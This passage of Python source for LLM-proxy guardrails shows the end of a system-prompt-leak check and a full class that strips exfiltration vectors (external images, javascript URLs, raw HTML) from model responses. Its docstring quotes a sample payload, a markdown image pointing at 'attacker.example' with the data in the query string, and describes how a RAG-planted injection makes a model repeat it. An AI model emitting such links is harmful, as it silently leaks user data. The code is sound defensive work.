                # exception escaping the LiteLLM hook. Scoped to THIS text —
                # a scan failure on one candidate must not discard another
                # text's already-computed, already-audited decision in the
                # same batch (the Task 11 lesson `G2bPiiOutput.apply_guardrail`
                # documents at length).
                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                    time.perf_counter() - started
                )
                self._on_outage(data, exc)
                continue
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )
            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

            decision = decide(self._control, findings, grounded=False)
            if decision.action is Action.ALLOW:
                continue

            enforced = self._enforcing()
            event = self._emit(data, decision, (), None, enforced)
            if enforced:
                raise GuardrailBlocked(
                    code="LLM07_SYSTEM_PROMPT_LEAK",
                    event_id=event["event_id"],
                    detail=decision.reason,
                    status_code=400,
                )

        return inputs


class G4OutputHandling(BaseNufiGuardrail):
    """Strips exfiltration vectors from a response without discarding it.

    An attacker plants `![](https://attacker.example/log?d=<summary>)` in a
    RAG-indexed document; the model repeats it; the client renders the
    markdown; the browser fetches it with the data attached — no click, no
    other user interaction. Unlike `G3SystemPromptLeak`, this control never
    blocks: discarding a whole answer over one embedded image is
    disproportionate when the fix is to remove the element and keep the rest.
    """

    control_id = "G4"
    # This control has no blocking mechanism at all — every path through
    # `apply_guardrail` and `_on_outage` ends in returning (a possibly
    # rewritten) `inputs`, never `GuardrailBlocked`, in every mode, on every
    # finding. Explicit (matching `G2aPiiInput`'s style) rather than left to
    # the inherited default so the "G4 never blocks" invariant is stated
    # here, next to the class it describes, not just implied by omission —
    # recording `enforced=True` on an outage this control cannot act on
    # would write a phantom entry into `nufi_guardrail_decisions_total
    # {action="block", enforced="true"}`, the series G1Injection shares
    # where every entry IS a real block.
    outage_can_enforce = False

    @staticmethod
    def strip(text: str, findings: list[Any]) -> str:
        """Replace each finding's span with `[removed:ENTITY]`, back to front.

        Mirrors `G2bPiiOutput.redact`'s clamping (see that method's
        docstring for the full reasoning): findings are processed in
        DESCENDING `start` order, and each finding's offsets are clamped to
        `[0, len(text)]` and to the region not yet consumed by a
        previously-processed (higher-start) finding. `scan_exfil`'s three
        finding kinds (`EXTERNAL_IMAGE`, `JAVASCRIPT_URL`, `RAW_HTML`) come
        from non-overlapping regexes today, but trusting "the regexes never
        overlap" absolutely is exactly the assumption an earlier draft of
        `G2bPiiOutput.redact` made about Presidio and the secrets scanner
        before Task 11 found it broken by two independent detectors
        reporting overlapping spans on the same text — unclamped offsets on
        an overlapping or out-of-bounds finding corrupt the surrounding text
        instead of raising, so nothing would ever surface the mistake.
        """
        if not findings:
            return text
        length = len(text)
        out = text
        consumed_from = length
        for finding in sorted(findings, key=lambda f: f.start, reverse=True):
            start = max(0, min(finding.start, length))
            end = max(start, min(finding.end, length))
            end = min(end, consumed_from)
            if start >= end:
                # Fully inside a region a higher-start finding already
                # removed (or an offset that does not fit `text` at all) —
                # nothing left here to act on.
                continue
            label = finding.entity or "REMOVED"
            out = out[:start] + f"[removed:{label}]" + out[end:]
            consumed_from = start
        return out

    def _on_outage(self, item: str, request_data: Any, exc: Exception) -> str:
        """Record the outage, then fail open: return `item` unstripped.

        Mirrors `G2bPiiOutput._on_outage`: `enforced` is always `False` —
        this control has no mechanism to withhold or alter a response at all
        (unlike `G3SystemPromptLeak`, it never raises `GuardrailBlocked`),
        so recording anything else would claim an effect that never
        happened. Failing open here means an unscanned exfiltration vector
        reaches the client unstripped — the same "invisible unless recorded"
        risk `G2bPiiOutput._on_outage` documents for unredacted PII, so the
        outage is still routed through `_emit` rather than only flipping
        `GUARDRAIL_DEGRADED` (a fleet-wide gauge an operator investigating
        one specific report cannot attach to any one request).
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not scan response (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        data = request_data if isinstance(request_data, dict) else {}
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        self._emit(data, decision, (), None, False)
        return item

    async def apply_guardrail(
        self,
        inputs: dict[str, Any],
        request_data: dict[str, Any] | None,
        input_type: str,
        logging_obj: Any = None,
    ) -> dict[str, Any]:
        """Strip exfiltration vectors from a response, per text.

        Same real `apply_guardrail` contract as `G2bPiiOutput` and
        `G3SystemPromptLeak` — see `G2bPiiOutput.apply_guardrail`'s
        docstring for why the signature and the `"response"`-only gate are
        load-bearing. Each text is scanned and decided independently, for
        the same reason `G2bPiiOutput` documents: nothing on `Finding`
        identifies which text produced it, and one text's scan failure must
        not discard another text's already-computed, already-audited strip.
        """
        if input_type != "response" or not self._control.enabled:
            return inputs

        texts = inputs.get("texts") or []
        if not texts:
            return inputs

        allowlist = list(self._control.options.get("image_host_allowlist") or [])
        data = request_data if isinstance(request_data, dict) else {}
        enforced = self._enforcing()
        rewritten: list[str] = []

        for item in texts:
            if not item:
                rewritten.append(item)
                continue

            started = time.perf_counter()
            try:
                findings = scan_exfil(item, allowlist)
            except Exception as exc:
                # Caught broadly for the same reason as `G2bPiiOutput`:
                # `scan_exfil` is documented pure and never-raising, but
                # trusting that absolutely is one bug away from an unhandled
                # exception escaping this hook. Scoped to THIS item only.
                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                    time.perf_counter() - started
                )
                rewritten.append(self._on_outage(item, data, exc))
                continue
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )
            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

            decision = decide(self._control, findings, grounded=False)
            if decision.action is not Action.REDACT:
                rewritten.append(item)
                continue

            self._emit(data, decision, (), None, enforced)
            rewritten.append(self.strip(item, list(decision.findings)) if enforced else item)

        if enforced:
            inputs["texts"] = rewritten
        return inputs


g1_injection = G1Injection()
g2a_pii_input = G2aPiiInput()
g2b_pii_output = G2bPiiOutput()
g3_system_prompt_leak = G3SystemPromptLeak()
g4_output_handling = G4OutputHandling()
